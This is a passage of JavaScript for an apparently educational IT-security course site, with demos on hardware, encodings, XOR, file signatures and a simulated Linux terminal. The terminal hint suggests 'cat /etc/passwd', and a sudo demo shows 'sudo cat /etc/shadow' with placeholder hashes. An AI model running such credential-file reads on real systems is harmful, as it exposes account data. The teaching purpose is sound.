        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">CPU Context Switching</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><span>Cores:</span><select id="cpuCores" style="padding:4px 8px;border-radius:4px;border:1px solid var(--border)"><option value="1">1</option><option value="2" selected>2</option><option value="4">4</option></select><button class="demo-btn demo-btn-sm" id="cpuStart">Start</button><button class="demo-btn demo-btn-sm" id="cpuStop">Stop</button></div><div id="cpuGrid" style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"></div><div id="cpuQueue" style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Tasks waiting: <span id="cpuWaiting">0</span></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>Each core can only run ONE task at a time. With context switching, the CPU rapidly alternates between tasks to create the illusion of multitasking.</p></div></div></div>';
        var interval;
        var tasks = ['Word','Browser','Music','Email','Game','Excel','Chat','Antivirus'];
        var colors = ['#e74c3c','#3498db','#f39c12','#2ecc71','#9b59b6','#e67e22','#1abc9c','#34495e'];
        function run() {
            clearInterval(interval);
            var n = +$('#cpuCores').value;
            var grid = $('#cpuGrid');
            grid.innerHTML = '';
            for(var i=0;i<n;i++) grid.innerHTML += '<div style="background:var(--bg-secondary);border-radius:8px;padding:16px;min-width:120px;text-align:center"><div style="font-size:0.75rem;color:var(--text-muted)">Core '+i+'</div><div id="coreTask'+i+'" style="font-size:1.5rem;margin:8px 0">...</div><div id="coreLabel'+i+'" style="font-size:0.8rem">Idle</div></div>';
            var tick=0;
            interval = setInterval(function(){
                for(var i=0;i<n;i++){
                    var idx=(tick+i)%tasks.length;
                    $('#coreTask'+i).textContent=tasks[idx];
                    $('#coreLabel'+i).style.color=colors[idx];
                }
                $('#cpuWaiting').textContent=Math.max(0,tasks.length-n);
                tick++;
            },800);
        }
        $('#cpuStart').onclick = run;
        $('#cpuStop').onclick = function(){clearInterval(interval);};
        run();
    }

    /* ============================================================
       C1: RAM DEMO
       ============================================================ */
    function demoRAM(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">RAM vs Storage Speed Comparison</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><button class="demo-btn" id="ramRun">Run Speed Test</button><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="flex:1;min-width:200px"><div style="font-weight:bold;margin-bottom:8px">RAM (DDR5)</div><div style="background:#edf2f7;border-radius:8px;height:30px;overflow:hidden"><div id="ramBar" style="background:#3498db;height:100%;width:0;transition:width 0.3s;border-radius:8px;display:flex;align-items:center;padding-left:8px;color:white;font-size:0.75rem"></div></div></div><div style="flex:1;min-width:200px"><div style="font-weight:bold;margin-bottom:8px">NVMe SSD</div><div style="background:#edf2f7;border-radius:8px;height:30px;overflow:hidden"><div id="ssdBar" style="background:#2ecc71;height:100%;width:0;transition:width 0.3s;border-radius:8px;display:flex;align-items:center;padding-left:8px;color:white;font-size:0.75rem"></div></div></div><div style="flex:1;min-width:200px"><div style="font-weight:bold;margin-bottom:8px">HDD (7200 RPM)</div><div style="background:#edf2f7;border-radius:8px;height:30px;overflow:hidden"><div id="hddBar" style="background:#e74c3c;height:100%;width:0;transition:width 0.3s;border-radius:8px;display:flex;align-items:center;padding-left:8px;color:white;font-size:0.75rem"></div></div></div></div><div id="ramResult" style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Click Run to compare speeds</div></div></div>';
        $('#ramRun').onclick = function(){
            var speeds = [{id:'ramBar',speed:51200,label:'51,200 MB/s'},{id:'ssdBar',speed:7000,label:'7,000 MB/s'},{id:'hddBar',speed:200,label:'200 MB/s'}];
            speeds.forEach(function(s){var el=$('#'+s.id);el.style.width='0';el.textContent='';});
            var step=0;
            var iv=setInterval(function(){
                step+=2;
                speeds.forEach(function(s){
                    var pct=Math.min(100,(s.speed/51200)*step*50);
                    var el=$('#'+s.id);el.style.width=pct+'%';
                    if(pct>=((s.speed/51200)*100)) el.textContent=' '+s.label;
                });
                if(step>=100){clearInterval(iv);$('#ramResult').textContent='RAM is ~7x faster than NVMe SSD and ~256x faster than HDD!';}
            },50);
        };
    }

    /* ============================================================
       C1: BINARY NUMBER BASE DEMO
       ============================================================ */
    function demoBinary(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Number Base Converter</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center;flex-wrap:wrap"><input id="decIn" type="number" min="0" max="255" value="42" style="width:80px;padding:8px;border-radius:6px;border:1px solid var(--border);text-align:center;font-size:1.2rem" placeholder="0-255"><span style="font-size:0.85rem;color:var(--text-muted)">Decimal (0-255)</span></div><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Binary (Base 2)</div><div id="binOut" style="font-family:var(--font-mono);font-size:1.3rem;letter-spacing:2px">00101010</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Hexadecimal (Base 16)</div><div id="hexOut" style="font-family:var(--font-mono);font-size:1.3rem">0x2A</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Octal (Base 8)</div><div id="octOut" style="font-family:var(--font-mono);font-size:1.3rem">052</div></div></div><div style="display:flex;gap:4px;justify-content:center" id="bitGrid"></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>Click individual bits to toggle them! Each bit position represents a power of 2. One byte (8 bits) can represent values 0-255.</p></div></div></div>';
        var val=42;
        function render(){
            var bin=val.toString(2).padStart(8,'0');
            $('#binOut').textContent=bin;
            $('#hexOut').textContent='0x'+val.toString(16).toUpperCase().padStart(2,'0');
            $('#octOut').textContent='0'+val.toString(8);
            $('#decIn').value=val;
            var grid=$('#bitGrid');grid.innerHTML='';
            for(var i=7;i>=0;i--){
                var bit=(val>>i)&1;
                grid.innerHTML+='<div style="display:flex;flex-direction:column;align-items:center;gap:2px"><span style="font-size:0.65rem;color:var(--text-muted)">'+Math.pow(2,i)+'</span><button class="demo-btn demo-btn-sm bitBtn" data-pos="'+i+'" style="width:36px;height:36px;font-family:var(--font-mono);font-size:1rem;'+(bit?'background:var(--accent);color:white':'')+'">'+bit+'</button></div>';
            }
            $$('.bitBtn').forEach(function(b){b.onclick=function(){val^=(1<<+b.dataset.pos);render();};});
        }
        $('#decIn').oninput=function(){val=Math.min(255,Math.max(0,+$('#decIn').value||0));render();};
        render();
    }

    /* ============================================================
       C1: ASCII DEMO
       ============================================================ */
    function demoASCII(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">ASCII Character Lookup</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><input id="asciiIn" maxlength="1" value="A" style="width:60px;padding:8px;border-radius:6px;border:1px solid var(--border);text-align:center;font-size:1.5rem"><span style="color:var(--text-muted)">Enter a character</span></div><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:120px"><div style="font-size:0.8rem;color:var(--text-muted)">Decimal</div><div id="ascDec" style="font-size:1.5rem;font-weight:bold">65</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:120px"><div style="font-size:0.8rem;color:var(--text-muted)">Hex</div><div id="ascHex" style="font-size:1.5rem;font-weight:bold;font-family:var(--font-mono)">0x41</div></div><div style="background:var(--bg-secondary);padding:16px;border-radius:8px;text-align:center;min-width:120px"><div style="font-size:0.8rem;color:var(--text-muted)">Binary</div><div id="ascBin" style="font-size:1.5rem;font-weight:bold;font-family:var(--font-mono)">01000001</div></div></div><div style="max-height:150px;overflow-y:auto;background:var(--bg-secondary);padding:12px;border-radius:8px;font-family:var(--font-mono);font-size:0.75rem;line-height:1.8" id="ascTable"></div></div></div>';
        function update(){
            var c=$('#asciiIn').value||'A';var code=c.charCodeAt(0);
            $('#ascDec').textContent=code;$('#ascHex').textContent='0x'+code.toString(16).toUpperCase().padStart(2,'0');$('#ascBin').textContent=code.toString(2).padStart(8,'0');
        }
        var table=$('#ascTable');var t='';for(var i=32;i<127;i++)t+=i.toString().padStart(3)+' = '+String.fromCharCode(i)+'  ';table.textContent=t;
        $('#asciiIn').oninput=update;
    }

    /* ============================================================
       C1: BASE64 DEMO
       ============================================================ */
    function demoBase64(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">ENCODING != ENCRYPTION</span><span class="demo-title">Base64 Encoder/Decoder</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;align-items:center;justify-content:center"><select id="b64Mode" style="padding:6px;border-radius:4px;border:1px solid var(--border)"><option value="enc">Encode</option><option value="dec">Decode</option></select></div><div style="display:flex;gap:16px;flex-wrap:wrap"><div style="flex:1;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Input</div><textarea id="b64In" rows="3" style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);resize:vertical">Hello, World!</textarea></div><div style="flex:1;min-width:200px"><div style="font-size:0.8rem;color:var(--text-muted);margin-bottom:4px">Output</div><textarea id="b64Out" rows="3" readonly style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono);background:var(--bg-secondary);resize:vertical"></textarea></div></div><button class="demo-btn" id="b64Go">Convert</button></div><div class="demo-explanation"><span class="explanation-icon">warning</span><div class="explanation-text"><p><strong>Base64 is NOT encryption!</strong> Anyone can decode it. Never use it to protect passwords, API keys, or sensitive data.</p></div></div></div>';
        function convert(){
            try{
                if($('#b64Mode').value==='enc') $('#b64Out').value=btoa($('#b64In').value);
                else $('#b64Out').value=atob($('#b64In').value);
            }catch(e){$('#b64Out').value='Error: Invalid input';}
        }
        $('#b64Go').onclick=convert;$('#b64In').oninput=convert;$('#b64Mode').onchange=convert;convert();
    }

    /* ============================================================
       C1: FILE HEADERS DEMO
       ============================================================ */
    function demoFileHeaders(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">SECURITY</span><span class="demo-title">File Magic Numbers</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><p style="text-align:center;font-size:0.85rem;color:var(--text-muted)">Can you identify the real file type? Extensions can lie!</p><div style="display:flex;gap:12px;flex-wrap:wrap;justify-content:center" id="fhFiles"></div><div id="fhResult" style="text-align:center;padding:16px;background:var(--bg-secondary);border-radius:8px;min-height:60px;font-family:var(--font-mono);font-size:0.85rem"></div></div></div>';
        var files = [
            {name:'photo.jpg',magic:'FF D8 FF E0',real:'JPEG Image',safe:true},
            {name:'document.pdf',magic:'25 50 44 46',real:'PDF Document',safe:true},
            {name:'image.png',magic:'7F 45 4C 46',real:'ELF Executable (Linux binary disguised as PNG)',safe:false},
            {name:'report.docx',magic:'50 4B 03 04',real:'ZIP Archive (DOCX is a ZIP)',safe:true},
            {name:'invoice.pdf',magic:'4D 5A 90 00',real:'Windows EXE (Malware disguised as PDF)',safe:false}
        ];
        var cont=$('#fhFiles');
        files.forEach(function(f,i){
            cont.innerHTML+='<button class="demo-btn demo-btn-sm" data-idx="'+i+'" style="min-width:120px">'+f.name+'</button>';
        });
        $$('#fhFiles .demo-btn').forEach(function(b){b.onclick=function(){
            var f=files[+b.dataset.idx];
            $('#fhResult').innerHTML='<div>File: <strong>'+f.name+'</strong></div><div>Magic Bytes: <code>'+f.magic+'</code></div><div style="margin-top:8px;color:'+(f.safe?'var(--success)':'var(--danger)')+'"><strong>'+f.real+'</strong></div>'+(f.safe?'':'<div style="margin-top:4px;color:var(--danger)">This file is NOT what it claims to be!</div>');
        };});
    }

    /* ============================================================
       C1: LOGIC GATES DEMO
       ============================================================ */
    function demoLogicGates(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Logic Gate Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="gateBtns"><button class="demo-btn demo-btn-sm active" data-gate="AND">AND</button><button class="demo-btn demo-btn-sm" data-gate="OR">OR</button><button class="demo-btn demo-btn-sm" data-gate="XOR">XOR</button><button class="demo-btn demo-btn-sm" data-gate="NAND">NAND</button><button class="demo-btn demo-btn-sm" data-gate="NOR">NOR</button><button class="demo-btn demo-btn-sm" data-gate="NOT">NOT</button></div><div style="display:flex;gap:24px;align-items:center;justify-content:center"><div><div style="font-size:0.8rem;color:var(--text-muted);text-align:center;margin-bottom:4px">Input A</div><button id="inA" class="demo-btn" style="width:60px;height:60px;font-size:1.5rem;font-weight:bold">0</button></div><div id="gateSymbol" style="font-size:2rem;font-weight:bold;color:var(--accent)">AND</div><div id="inBWrap"><div style="font-size:0.8rem;color:var(--text-muted);text-align:center;margin-bottom:4px">Input B</div><button id="inB" class="demo-btn" style="width:60px;height:60px;font-size:1.5rem;font-weight:bold">0</button></div><div style="font-size:2rem">=</div><div><div style="font-size:0.8rem;color:var(--text-muted);text-align:center;margin-bottom:4px">Output</div><div id="gateOut" style="width:60px;height:60px;display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:bold;background:var(--bg-secondary);border-radius:8px">0</div></div></div><div id="truthTable" style="font-family:var(--font-mono);font-size:0.8rem;text-align:center"></div></div></div>';
        var a=0,b=0,gate='AND';
        var ops={AND:function(a,b){return a&b;},OR:function(a,b){return a|b;},XOR:function(a,b){return a^b;},NAND:function(a,b){return (a&b)?0:1;},NOR:function(a,b){return (a|b)?0:1;},NOT:function(a){return a?0:1;}};
        function calc(){
            var r=gate==='NOT'?ops[gate](a):ops[gate](a,b);
            $('#gateOut').textContent=r;$('#gateOut').style.background=r?'var(--accent)':'var(--bg-secondary)';$('#gateOut').style.color=r?'white':'inherit';
            $('#inBWrap').style.display=gate==='NOT'?'none':'block';
            var tt='A | B | Out\n';for(var i=0;i<2;i++)for(var j=0;j<2;j++){var o=gate==='NOT'?ops[gate](i):ops[gate](i,j);tt+=i+' | '+j+' | '+o+'\n';if(gate==='NOT')break;}
            $('#truthTable').textContent=tt;
        }
        $('#inA').onclick=function(){a=a?0:1;$('#inA').textContent=a;calc();};
        $('#inB').onclick=function(){b=b?0:1;$('#inB').textContent=b;calc();};
        $$('#gateBtns .demo-btn').forEach(function(btn){btn.onclick=function(){
            $$('#gateBtns .demo-btn').forEach(function(x){x.classList.remove('active');});btn.classList.add('active');
            gate=btn.dataset.gate;$('#gateSymbol').textContent=gate;calc();
        };});
        calc();
    }

    /* ============================================================
       C1: XOR ENCRYPTION DEMO
       ============================================================ */
    function demoXOR(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">XOR Cipher</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center;align-items:center"><div style="flex:1;min-width:180px"><div style="font-size:0.8rem;color:var(--text-muted)">Plaintext</div><input id="xorText" value="Hello" style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"></div><div style="font-size:1.5rem;padding-top:16px">XOR</div><div style="flex:1;min-width:100px"><div style="font-size:0.8rem;color:var(--text-muted)">Key</div><input id="xorKey" value="K" maxlength="8" style="width:100%;padding:8px;border-radius:6px;border:1px solid var(--border);font-family:var(--font-mono)"></div></div><div style="display:flex;gap:16px;flex-wrap:wrap;justify-content:center"><div style="flex:1;min-width:200px;background:var(--bg-secondary);padding:12px;border-radius:8px"><div style="font-size:0.8rem;color:var(--text-muted)">Ciphertext (Hex)</div><div id="xorCipher" style="font-family:var(--font-mono);word-break:break-all"></div></div><div style="flex:1;min-width:200px;background:var(--bg-secondary);padding:12px;border-radius:8px"><div style="font-size:0.8rem;color:var(--text-muted)">Decrypted</div><div id="xorDec" style="font-family:var(--font-mono)"></div></div></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>XOR encryption: plaintext XOR key = ciphertext, and ciphertext XOR key = plaintext. The same operation both encrypts and decrypts!</p></div></div></div>';
        function compute(){
            var txt=$('#xorText').value,key=$('#xorKey').value||'K';
            var cipher=[],dec=[];
            for(var i=0;i<txt.length;i++){var c=txt.charCodeAt(i)^key.charCodeAt(i%key.length);cipher.push(c.toString(16).padStart(2,'0'));dec.push(String.fromCharCode(c^key.charCodeAt(i%key.length)));}
            $('#xorCipher').textContent=cipher.join(' ');$('#xorDec').textContent=dec.join('');
        }
        $('#xorText').oninput=compute;$('#xorKey').oninput=compute;compute();
    }

    /* ============================================================
       C1: FILE SYSTEMS DEMO
       ============================================================ */
    function demoFileSystems(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">File System Comparison</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="fsBtns"><button class="demo-btn demo-btn-sm active" data-fs="fat32">FAT32</button><button class="demo-btn demo-btn-sm" data-fs="ntfs">NTFS</button><button class="demo-btn demo-btn-sm" data-fs="ext4">EXT4</button><button class="demo-btn demo-btn-sm" data-fs="exfat">exFAT</button></div><div id="fsInfo" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;line-height:1.8"></div></div></div>';
        var info={
            fat32:'<strong>FAT32</strong><br>Max File: 4 GB<br>Max Volume: 2 TB<br>OS: Universal (Windows, Mac, Linux)<br>Permissions: None<br>Journaling: No<br>Best For: USB drives, memory cards',
            ntfs:'<strong>NTFS</strong><br>Max File: 16 EB<br>Max Volume: 256 TB<br>OS: Windows (read-only on Mac/Linux)<br>Permissions: Full ACL<br>Journaling: Yes<br>Encryption: BitLocker/EFS<br>Best For: Windows system drives',
            ext4:'<strong>EXT4</strong><br>Max File: 16 TB<br>Max Volume: 1 EB<br>OS: Linux (default)<br>Permissions: Unix (rwx)<br>Journaling: Yes<br>Best For: Linux system drives',
            exfat:'<strong>exFAT</strong><br>Max File: 16 EB<br>Max Volume: 128 PB<br>OS: Universal<br>Permissions: None<br>Journaling: No<br>Best For: Large files on USB drives'
        };
        function show(fs){$('#fsInfo').innerHTML=info[fs];}
        $$('#fsBtns .demo-btn').forEach(function(b){b.onclick=function(){$$('#fsBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');show(b.dataset.fs);};});
        show('fat32');
    }

    /* ============================================================
       C1: CLOUD MODELS DEMO
       ============================================================ */
    function demoCloud(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Cloud Service Models</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center" id="cloudBtns"><button class="demo-btn demo-btn-sm active" data-m="onprem">On-Premises</button><button class="demo-btn demo-btn-sm" data-m="iaas">IaaS</button><button class="demo-btn demo-btn-sm" data-m="paas">PaaS</button><button class="demo-btn demo-btn-sm" data-m="saas">SaaS</button></div><div style="display:flex;gap:4px;flex-direction:column;align-items:center" id="cloudStack"></div></div></div>';
        var layers=['Applications','Data','Runtime','Middleware','OS','Virtualization','Servers','Storage','Networking'];
        var managed={onprem:[],iaas:['Networking','Storage','Servers','Virtualization'],paas:['Networking','Storage','Servers','Virtualization','OS','Middleware','Runtime'],saas:['Networking','Storage','Servers','Virtualization','OS','Middleware','Runtime','Data','Applications']};
        function render(m){
            var stack=$('#cloudStack');stack.innerHTML='';
            layers.forEach(function(l){
                var prov=managed[m].indexOf(l)>=0;
                stack.innerHTML+='<div style="width:300px;padding:8px 16px;text-align:center;border-radius:4px;font-size:0.85rem;background:'+(prov?'var(--accent)':'var(--bg-secondary)')+';color:'+(prov?'white':'inherit')+';border:1px solid '+(prov?'transparent':'var(--border)')+'">'+l+(prov?' [Provider]':' [You]')+'</div>';
            });
        }
        $$('#cloudBtns .demo-btn').forEach(function(b){b.onclick=function(){$$('#cloudBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');render(b.dataset.m);};});
        render('onprem');
    }

    /* ============================================================
       C2: OS BOOT PROCESS DEMO
       ============================================================ */
    function demoOS(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Boot Process Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><button class="demo-btn" id="bootBtn">Power On</button><div id="bootLog" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.8rem;padding:16px;border-radius:8px;min-height:200px;white-space:pre-line;overflow-y:auto;max-height:300px"></div></div></div>';
        var steps=['[BIOS] Power-On Self-Test (POST)... OK','[BIOS] Detecting CPU: Intel i7-12700K @ 3.6 GHz','[BIOS] Detecting RAM: 32768 MB DDR5... OK','[BIOS] Detecting storage: NVMe SSD 1TB... OK','[BIOS] Searching for boot device...','[UEFI] Secure Boot: Verified','[GRUB] Loading kernel: vmlinuz-5.15.0-generic','[Kernel] Initializing memory management','[Kernel] Loading device drivers','[Kernel] Mounting root filesystem (ext4)','[Init] Starting systemd (PID 1)','[systemd] Starting network services','[systemd] Starting SSH server','[systemd] Starting Apache web server','[Login] System ready. Login prompt displayed.','','Welcome to Ubuntu 22.04 LTS','hostname login: _'];
        $('#bootBtn').onclick=function(){
            var log=$('#bootLog');log.textContent='';var i=0;
            var iv=setInterval(function(){if(i<steps.length){log.textContent+=steps[i]+'\n';log.scrollTop=log.scrollHeight;i++;}else clearInterval(iv);},300);
        };
    }

    /* ============================================================
       C2: VM / HYPERVISOR DEMO
       ============================================================ */
    function demoVM(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Hypervisor Types</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center"><button class="demo-btn demo-btn-sm active" id="hvType1" data-t="1">Type 1 (Bare-Metal)</button><button class="demo-btn demo-btn-sm" id="hvType2" data-t="2">Type 2 (Hosted)</button></div><div id="hvDiagram" style="display:flex;flex-direction:column;gap:4px;align-items:center"></div></div><div class="demo-explanation"><span class="explanation-icon">info</span><div class="explanation-text"><p>Type 1 runs directly on hardware (data centers). Type 2 runs on a host OS (your desktop with VirtualBox).</p></div></div></div>';
        function draw(type){
            var d=$('#hvDiagram');d.innerHTML='';
            var style='width:300px;padding:10px;text-align:center;border-radius:4px;font-size:0.85rem;';
            if(type==='1'){
                d.innerHTML='<div style="'+style+'background:#3498db;color:white">VM 1 (Windows)</div><div style="'+style+'background:#2ecc71;color:white">VM 2 (Linux)</div><div style="'+style+'background:#9b59b6;color:white">VM 3 (Kali)</div><div style="'+style+'background:#e74c3c;color:white;font-weight:bold">Hypervisor (ESXi / Hyper-V)</div><div style="'+style+'background:#34495e;color:white">Hardware</div>';
            } else {
                d.innerHTML='<div style="'+style+'background:#3498db;color:white">VM 1 (Kali)</div><div style="'+style+'background:#2ecc71;color:white">VM 2 (Win XP)</div><div style="'+style+'background:#9b59b6;color:white;font-weight:bold">Hypervisor (VirtualBox)</div><div style="'+style+'background:#e67e22;color:white">Host OS (Windows / macOS)</div><div style="'+style+'background:#34495e;color:white">Hardware</div>';
            }
        }
        $('#hvType1').onclick=function(){$('#hvType1').classList.add('active');$('#hvType2').classList.remove('active');draw('1');};
        $('#hvType2').onclick=function(){$('#hvType2').classList.add('active');$('#hvType1').classList.remove('active');draw('2');};
        draw('1');
    }

    /* ============================================================
       C3: TERMINAL DEMO
       ============================================================ */
    function demoTerminal(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Linux Terminal Simulator</span></div><div class="demo-visual" style="flex-direction:column;gap:0"><div style="background:#2d2d2d;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px 8px 0 0;min-height:250px;max-height:350px;overflow-y:auto" id="termOut"><div>user@zentinels:~$ <span style="color:#ccc">Type a command below (try: ls, pwd, whoami, cat /etc/passwd, help)</span></div></div><div style="display:flex;background:#2d2d2d;padding:4px 16px;border-radius:0 0 8px 8px"><span style="color:#00ff41;font-family:var(--font-mono);font-size:0.82rem">user@zentinels:~$ </span><input id="termIn" style="flex:1;background:transparent;border:none;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;outline:none" autofocus></div></div></div>';
        var fs={'etc/passwd':'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nuser:x:1000:1000:User:/home/user:/bin/bash','etc/shadow':'Permission denied','home/user/notes.txt':'Remember: change the default password!\nAdmin panel: http://localhost:8080/admin'};
        var cmds={
            ls:function(){return 'Desktop  Documents  Downloads  notes.txt  secret.key';},
            pwd:function(){return '/home/user';},
            whoami:function(){return 'user';},
            id:function(){return 'uid=1000(user) gid=1000(user) groups=1000(user),27(sudo)';},
            uname:function(){return 'Linux zentinels 5.15.0-generic x86_64 GNU/Linux';},
            hostname:function(){return 'zentinels';},
            date:function(){return new Date().toString();},
            help:function(){return 'Available: ls, pwd, whoami, id, uname, hostname, date, cat <file>, echo <text>, clear';},
            clear:function(){return '__CLEAR__';}
        };
        var out=$('#termOut');
        $('#termIn').onkeydown=function(e){
            if(e.key!=='Enter')return;
            var cmd=$('#termIn').value.trim();$('#termIn').value='';
            if(!cmd)return;
            var result;var parts=cmd.split(/\s+/);
            if(parts[0]==='cat'&&parts[1]){var path=parts[1].replace(/^\//,'');result=fs[path]||'cat: '+parts[1]+': No such file or directory';}
            else if(parts[0]==='echo') result=parts.slice(1).join(' ');
            else if(cmds[parts[0]]) result=cmds[parts[0]]();
            else result=parts[0]+': command not found';
            if(result==='__CLEAR__'){out.innerHTML='';}else{out.innerHTML+='<div style="color:#ccc">user@zentinels:~$ '+esc(cmd)+'</div><div>'+esc(result)+'</div>';out.scrollTop=out.scrollHeight;}
        };
    }

    /* ============================================================
       C3: SUDO DEMO
       ============================================================ */
    function demoSudo(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">sudo vs su</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;justify-content:center;flex-wrap:wrap" id="sudoBtns"><button class="demo-btn demo-btn-sm active" data-s="user">Normal User</button><button class="demo-btn demo-btn-sm" data-s="sudo">sudo command</button><button class="demo-btn demo-btn-sm" data-s="su">su - (root)</button></div><div id="sudoTerm" style="background:#1a1a2e;color:#00ff41;font-family:var(--font-mono);font-size:0.82rem;padding:16px;border-radius:8px;min-height:150px;white-space:pre-line"></div></div></div>';
        var scenarios={
            user:'user@box:~$ cat /etc/shadow\ncat: /etc/shadow: Permission denied\n\nuser@box:~$ apt install nmap\nE: Could not open lock file - open (13: Permission denied)',
            sudo:'user@box:~$ sudo cat /etc/shadow\n[sudo] password for user: ****\nroot:$6$randomhash:19000:0:99999:7:::\nuser:$6$anotherhash:19000:0:99999:7:::\n\nsudo runs ONE command as root. Your password. Audit trail logged.',
            su:'user@box:~$ su -\nPassword: ****\nroot@box:~# whoami\nroot\nroot@box:~# cat /etc/shadow\nroot:$6$randomhash:19000:0:99999:7:::\n\nsu opens a ROOT SHELL. Requires root password. No audit trail. Dangerous!'
        };
        $$('#sudoBtns .demo-btn').forEach(function(b){b.onclick=function(){
            $$('#sudoBtns .demo-btn').forEach(function(x){x.classList.remove('active');});b.classList.add('active');
            $('#sudoTerm').textContent=scenarios[b.dataset.s];
        };});
        $('#sudoTerm').textContent=scenarios.user;
    }

    /* ============================================================
       C3: LINUX FOLDERS DEMO
       ============================================================ */
    function demoFolders(pane) {
        pane.innerHTML = '<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Linux Directory Structure</span></div><div class="demo-visual" style="flex-direction:column;gap:16px"><div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dirBtns"></div><div id="dirDesc" style="background:var(--bg-secondary);padding:16px;border-radius:8px;font-size:0.85rem;line-height:1.8"></div></div></div>';
        var dirs={'/':'Root of the entire filesystem','/bin':'Essential command binaries: ls, cp, cat, grep','/etc':'System configuration files: passwd, shadow, fstab','/home':'User home directories','/var':'Variable data: logs, databases, web content','/tmp':'Temporary files. Cleared on reboot','/root':'Root user home directory (NOT /home/root)','/dev':'Device files. Hardware as files: /dev/sda, /dev/null','/proc':'Virtual filesystem: process and kernel info'};
        var btns=$('#dirBtns');
        Object.keys(dirs).forEach(function(d){btns.innerHTML+='<button class="demo-btn demo-btn-sm" data-dir="'+d+'">'+d+'</button>';});
        $$('#dirBtns .demo-btn').forEach(function(b){b.onclick=function(){
